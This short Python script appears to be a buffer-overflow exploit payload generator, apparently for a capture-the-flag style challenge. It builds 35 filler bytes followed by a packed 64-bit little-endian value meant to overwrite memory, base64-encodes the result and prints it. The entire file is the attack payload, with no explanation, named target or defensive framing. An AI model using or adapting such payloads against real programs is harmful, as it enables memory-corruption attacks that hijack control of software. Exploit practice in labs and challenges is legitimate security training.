
import sys
import struct
import base64

buf = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
buf += struct.pack('<Q', 10704580091712471072)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
